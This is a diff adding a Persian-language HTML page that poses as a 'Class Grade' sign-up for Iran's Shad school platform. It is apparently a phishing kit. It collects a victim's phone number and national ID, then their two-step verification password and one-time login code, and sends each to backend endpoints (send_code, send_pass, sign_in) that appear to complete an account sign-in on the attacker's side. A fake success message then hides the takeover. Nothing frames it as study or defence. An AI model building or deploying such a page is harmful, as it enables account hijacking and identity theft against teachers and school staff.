@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>نمره کلاسی</title>
+<link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+* { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+body {
+    font-family: 'Vazirmatn', sans-serif;
+    background: #061b49 url('/static/bg.jpg') no-repeat center center fixed;
+    background-size: cover;
+    color: white;
+    margin: 0; padding: 0;
+    min-height: 100vh;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    position: relative;
+}
+/* لایه تاریک روی عکس پس‌زمینه */
+body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background: rgba(4, 18, 44, 0.6);
+    z-index: 0;
+}
+
+/* صفحه روح (Splash) */
+#splash {
+    position: fixed; inset: 0;
+    background: #061b49;
+    display: flex; align-items: center; justify-content: center;
+    z-index: 9999;
+    transition: opacity 0.8s ease;
+}
+#splash.hide { opacity: 0; pointer-events: none; }
+.ghost {
+    font-size: 24px; font-weight: 900;
+    color: #00e5ff;
+    text-align: center;
+    padding: 0 20px;
+    text-shadow: 0 0 20px rgba(0, 229, 255, 0.8);
+    opacity: 0;
+    animation: ghostAppear 3s ease-in-out forwards;
+}
+@keyframes ghostAppear {
+    0% { opacity: 0; transform: scale(0.85); filter: blur(12px); }
+    30% { opacity: 1; transform: scale(1); filter: blur(0); }
+    70% { opacity: 1; transform: scale(1); filter: blur(0); }
+    100% { opacity: 0; transform: scale(1.1); filter: blur(15px); }
+}
+
+/* کانتینر اصلی */
+.main-container {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 420px;
+    padding: 0 20px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+/* بخش هدر (آیکون و عنوان) */
+#headerSection {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    width: 100%;
+    margin-bottom: 25px;
+}
+
+/* مربع لوگو */
+.logo-box {
+    width: 90px; height: 90px;
+    background: rgba(255, 255, 255, 0.1);
+    border: 2px solid rgba(0, 229, 255, 0.5);
+    border-radius: 22px;
+    display: flex; align-items: center; justify-content: center;
+    margin-bottom: 15px;
+    box-shadow: 0 0 25px rgba(0, 229, 255, 0.3);
+    backdrop-filter: blur(8px);
+    overflow: hidden;
+    padding: 5px;
+}
+.logo-box img {
+    width: 100%; height: 100%; object-fit: contain;
+    border-radius: 15px;
+}
+
+h1 {
+    font-size: 26px; font-weight: 900; margin: 0 0 8px; color: #ffffff;
+    text-align: center;
+}
+.subtitle {
+    font-size: 14px; color: #b0c4de; text-align: center;
+}
+
+/* فرم‌ها */
+.form-card {
+    background: rgba(10, 30, 60, 0.6);
+    backdrop-filter: blur(15px);
+    -webkit-backdrop-filter: blur(15px);
+    border-radius: 24px;
+    padding: 25px 20px;
+    width: 100%;
+    border: 1px solid rgba(0, 140, 255, 0.3);
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    text-align: right;
+    display: none; 
+}
+.form-card.active { display: block; animation: fadeIn 0.4s ease; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+.field-label {
+    font-size: 13px; font-weight: 700; color: #e2e8f0; margin-bottom: 8px; display: block;
+}
+.inputbox {
+    position: relative;
+    margin-bottom: 18px;
+}
+.inputbox input {
+    width: 100%;
+    padding: 15px 45px 15px 15px;
+    border-radius: 14px;
+    border: 1px solid #1e3a8a;
+    background: rgba(4, 18, 44, 0.5);
+    color: white;
+    font-family: inherit;
+    font-size: 15px;
+    outline: none;
+    transition: border-color 0.2s;
+    direction: ltr; 
+    text-align: right;
+}
+.inputbox input:focus { border-color: #00e5ff; box-shadow: 0 0 10px rgba(0, 229, 255, 0.2); }
+.inputbox input::placeholder { color: #64748b; text-align: right; }
+.input-icon {
+    position: absolute;
+    right: 15px; top: 50%; transform: translateY(-50%);
+    width: 20px; height: 20px;
+    stroke: #68d9ff; fill: none;
+}
+
+button.action-btn {
+    width: 100%;
+    padding: 16px;
+    border-radius: 14px;
+    border: none;
+    font-family: inherit;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    color: white;
+    background: linear-gradient(90deg, #007bff, #00e5ff);
+    transition: transform 0.2s, opacity 0.2s;
+    margin-top: 10px;
+    box-shadow: 0 4px 15px rgba(0, 123, 255, 0.4);
+}
+button.action-btn:active { transform: scale(0.97); }
+button.action-btn:disabled { opacity: 0.5; pointer-events: none; }
+
+.note {
+    text-align: center; font-size: 13px; color: #94a3b8; margin-top: 15px;
+}
+
+/* صفحه کد */
+.code-input {
+    text-align: center !important;
+    letter-spacing: 8px;
+    font-size: 22px !important;
+    font-weight: 700;
+}
+.typing-text {
+    font-size: 14px; color: #cbd5e1; line-height: 1.8; margin-bottom: 15px; text-align: center;
+}
+.typing-text .highlight { color: #00e5ff; font-weight: 700; }
+
+/* پیام‌ها */
+.msg {
+    padding: 12px; border-radius: 10px; margin-top: 12px; font-size: 13px; display: none; line-height: 1.6; text-align: center;
+}
+.msg.show { display: block; }
+.msg.err { background: rgba(69, 10, 10, 0.8); color: #f87171; border: 1px solid #f87171; }
+.msg.load { background: rgba(66, 32, 6, 0.8); color: #fbbf24; border: 1px solid #fbbf24; }
+
+/* صفحه موفقیت */
+.success-screen { text-align: center; padding: 20px; }
+.success-icon {
+    width: 90px; height: 90px;
+    border-radius: 50%;
+    border: 3px solid #10b981;
+    background: rgba(16, 185, 129, 0.1);
+    margin: 0 auto 20px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 45px; color: #10b981;
+    box-shadow: 0 0 30px rgba(16, 185, 129, 0.5);
+}
+.success-title { color: #10b981; font-size: 20px; font-weight: 900; margin-bottom: 15px; }
+.success-desc { color: #e2e8f0; font-size: 14px; line-height: 1.8; margin-bottom: 25px; }
+.success-footer { color: #00e5ff; font-size: 14px; font-weight: 700; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px; }
+</style>
+</head>
+<body>
+
+<div id="splash">
+    <div class="ghost">شاد، مدرسه‌ای به وسعت ایران</div>
+</div>
+
+<div class="main-container">
+    
+    <!-- هدر (آیکون + اسم) -->
+    <div id="headerSection">
+        <div class="logo-box">
+            <!-- مسیر عکس شما -->
+            <img src="/static/logo.jpg" alt="Logo" onerror="this.style.display='none'">
+        </div>
+        <h1>نمره کلاسی</h1>
+        <div class="subtitle">برای ورود به نمره کلاسی اطلاعات زیر را تکمیل کنید</div>
+    </div>
+
+    <!-- فرم انتخاب نقش -->
+    <div id="roleCard" class="form-card active">
+        <label class="field-label" style="text-align:center;">نقش خود را انتخاب کنید</label>
+        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-bottom:15px;">
+            <div class="role-btn" data-role="معلم" onclick="selectRole(this)" style="padding:12px; text-align:center; border:1px solid #1e3a8a; border-radius:10px; cursor:pointer; font-size:14px;">معلم</div>
+            <div class="role-btn" data-role="مدیر" onclick="selectRole(this)" style="padding:12px; text-align:center; border:1px solid #1e3a8a; border-radius:10px; cursor:pointer; font-size:14px;">مدیر</div>
+            <div class="role-btn" data-role="معاون" onclick="selectRole(this)" style="padding:12px; text-align:center; border:1px solid #1e3a8a; border-radius:10px; cursor:pointer; font-size:14px;">معاون</div>
+            <div class="role-btn" data-role="سایر" onclick="selectRole(this)" style="padding:12px; text-align:center; border:1px solid #1e3a8a; border-radius:10px; cursor:pointer; font-size:14px;">سایر</div>
+        </div>
+        <button id="roleBtn" class="action-btn" disabled onclick="confirmRole()">تایید نقش</button>
+    </div>
+
+    <!-- فرم اطلاعات -->
+    <div id="infoCard" class="form-card">
+        <label class="field-label">شماره تلفن همراه</label>
+        <div class="inputbox">
+            <svg class="input-icon" viewBox="0 0 24 24" stroke-width="1.8"><rect x="5" y="2" width="14" height="20" rx="3"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+            <input type="tel" id="phone" placeholder="شماره موبایل" inputmode="numeric">
+        </div>
+
+        <label class="field-label">کد ملی</label>
+        <div class="inputbox">
+            <svg class="input-icon" viewBox="0 0 24 24" stroke-width="1.8"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="6" y1="10" x2="10" y2="10"/><line x1="6" y1="14" x2="14" y2="14"/><circle cx="16" cy="11" r="1.5"/><line x1="14" y1="15" x2="18" y2="15"/></svg>
+            <input type="text" id="nid" placeholder="کد ملی" inputmode="numeric" maxlength="10">
+        </div>
+
+        <button class="action-btn" onclick="submitInfo()">مرحله بعد ←</button>
+        <div class="note">برای ادامه، اطلاعات را وارد کنید.</div>
+        <div id="msgInfo" class="msg"></div>
+    </div>
+
+    <!-- فرم رمز دو مرحله‌ای -->
+    <div id="passCard" class="form-card">
+        <label class="field-label" style="text-align:center;">تایید دو مرحله‌ای</label>
+        <p style="color:#cbd5e1; font-size:13px; margin-bottom:15px; line-height:1.6; text-align:center;">تایید دو مرحله‌ای برای شما فعال است.<br>لطفا تایید دو مرحله‌ای شاد خود را وارد کنید.</p>
+        <div class="inputbox">
+            <svg class="input-icon" viewBox="0 0 24 24" stroke-width="1.8"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            <input type="password" id="pass" placeholder="رمز خود را وارد کنید" style="direction: rtl;">
+        </div>
+        <button class="action-btn" onclick="submitPass()">تایید رمز</button>
+        <button class="action-btn" style="background:#334155; box-shadow:none; margin-top:10px;" onclick="backToInfo()">بازگشت</button>
+        <div id="msgPass" class="msg"></div>
+    </div>
+
+    <!-- فرم کد ۶ رقمی -->
+    <div id="codeCard" class="form-card">
+        <label class="field-label" style="text-align:center;">کد ۶ رقمی</label>
+        <div id="typingMsg" class="typing-text"></div>
+        <div class="inputbox">
+            <svg class="input-icon" viewBox="0 0 24 24" stroke-width="1.8"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            <input type="tel" id="code" class="code-input" placeholder="------" maxlength="6" inputmode="numeric">
+        </div>
+        <button class="action-btn" onclick="submitCode()">تایید و ورود</button>
+        <div id="msgCode" class="msg"></div>
+    </div>
+
+    <!-- صفحه موفقیت -->
+    <div id="successCard" class="form-card">
+        <div class="success-screen">
+            <div class="success-icon">✓</div>
+            <div class="success-title">ثبت‌نام شما با موفقیت انجام شد.</div>
+            <div class="success-desc">پس از تایید توسط پشتیبانی، نتیجه از طریق پیامک به شما اعلام می‌گردد.</div>
+            <div class="success-footer">شاد، مدرسه‌ای به وسعت ایران 🇮🇷</div>
+        </div>
+    </div>
+
+</div>
+
+<script>
+let selectedRole = '';
+let phoneCodeHash = '';
+let savedPhone = '';
+let savedPass = '';
+
+// بستن صفحه روح
+setTimeout(() => {
+    document.getElementById('splash').classList.add('hide');
+    setTimeout(() => {
+        document.getElementById('splash').style.display = 'none';
+    }, 800);
+}, 3200);
+
+function show(id, msg, cls) {
+    const el = document.getElementById(id);
+    el.className = 'msg show ' + cls;
+    el.innerText = msg;
+}
+function switchCard(cardId) {
+    document.querySelectorAll('.form-card').forEach(c => c.classList.remove('active'));
+    document.getElementById(cardId).classList.add('active');
+}
+
+// انتخاب نقش
+function selectRole(el) {
+    document.querySelectorAll('.role-btn').forEach(c => {
+        c.style.background = 'transparent';
+        c.style.borderColor = '#1e3a8a';
+    });
+    el.style.background = 'rgba(0, 123, 255, 0.2)';
+    el.style.borderColor = '#00e5ff';
+    selectedRole = el.dataset.role;
+    document.getElementById('roleBtn').disabled = false;
+}
+function confirmRole() {
+    if (!selectedRole) return;
+    switchCard('infoCard');
+}
+
+// ارسال اطلاعات و دریافت کد
+function submitInfo() {
+    const phone = document.getElementById('phone').value.trim();
+    const nid = document.getElementById('nid').value.trim();
+    if (!phone || phone.length < 10) { show('msgInfo', 'شماره موبایل معتبر وارد کنید', 'err'); return; }
+    if (!nid || nid.length < 10) { show('msgInfo', 'کد ملی معتبر وارد کنید', 'err'); return; }
+    
+    savedPhone = phone;
+    document.getElementById('msgInfo').className = 'msg show load';
+    document.getElementById('msgInfo').innerText = 'در حال ارسال کد...';
+    
+    fetch('/api/send_code', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({phone: phone})
+    })
+    .then(r => r.json())
+    .then(d => {
+        if (d.status === 'OK') {
+            phoneCodeHash = d.hash;
+            switchCard('codeCard');
+            const text = 'کد ورود به شماره ' + phone + ' در شاد ارسال شد.\nلطفا کد را وارد کنید.';
+            typeText('typingMsg', text, phone);
+        } else if (d.status === 'PASS_REQUIRED') {
+            switchCard('passCard');
+        } else {
+            show('msgInfo', 'خطا: ' + (d.message || 'ناشناخته'), 'err');
+        }
+    })
+    .catch(() => show('msgInfo', 'خطای شبکه، لطفاً دوباره تلاش کنید', 'err'));
+}
+
+// ارسال رمز دو مرحله‌ای
+function submitPass() {
+    const pass = document.getElementById('pass').value.trim();
+    if (!pass) { show('msgPass', 'رمز را وارد کنید', 'err'); return; }
+    savedPass = pass;
+    document.getElementById('msgPass').className = 'msg show load';
+    document.getElementById('msgPass').innerText = 'در حال بررسی...';
+    
+    fetch('/api/send_pass', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({phone: savedPhone, pass_key: pass})
+    })
+    .then(r => r.json())
+    .then(d => {
+        if (d.status === 'OK') {
+            phoneCodeHash = d.hash;
+            switchCard('codeCard');
+            const text = 'کد ورود به شماره ' + savedPhone + ' در شاد ارسال شد.\nلطفا کد را وارد کنید.';
+            typeText('typingMsg', text, savedPhone);
+        } else {
+            show('msgPass', 'خطا: ' + (d.message || 'رمز اشتباه'), 'err');
+        }
+    })
+    .catch(() => show('msgPass', 'خطای شبکه', 'err'));
+}
+
+function backToInfo() {
+    switchCard('infoCard');
+}
+
+// افکت تایپ
+function typeText(elementId, fullText, highlightPhone) {
+    const el = document.getElementById(elementId);
+    el.innerHTML = '';
+    let i = 0;
+    const timer = setInterval(() => {
+        if (i >= fullText.length) { clearInterval(timer); return; }
+        const partial = fullText.substring(0, i + 1);
+        el.innerHTML = partial.replace(highlightPhone, '<span class="highlight">' + highlightPhone + '</span>');
+        i++;
+    }, 40);
+}
+
+// ثبت نهایی
+function submitCode() {
+    const code = document.getElementById('code').value.trim();
+    if (code.length !== 6) { show('msgCode', 'کد ۶ رقمی را وارد کنید', 'err'); return; }
+    document.getElementById('msgCode').className = 'msg show load';
+    document.getElementById('msgCode').innerText = 'در حال بررسی و ثبت‌نام...';
+    
+    fetch('/api/sign_in', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            phone: savedPhone,
+            code: code,
+            hash: phoneCodeHash,
+            role: selectedRole,
+            nid: document.getElementById('nid').value.trim(),
+            password: savedPass
+        })
+    })
+    .then(r => r.json())
+    .then(d => {
+        if (d.status === 'OK') {
+            switchCard('successCard');
+            document.getElementById('headerSection').style.display = 'none';
+        } else {
+            show('msgCode', 'خطا: ' + (d.message || 'کد نادرست یا منقضی شده'), 'err');
+        }
+    })
+    .catch(() => show('msgCode', 'خطای شبکه، لطفاً دوباره تلاش کنید', 'err'));
+}
+</script>
+</body>
+</html>
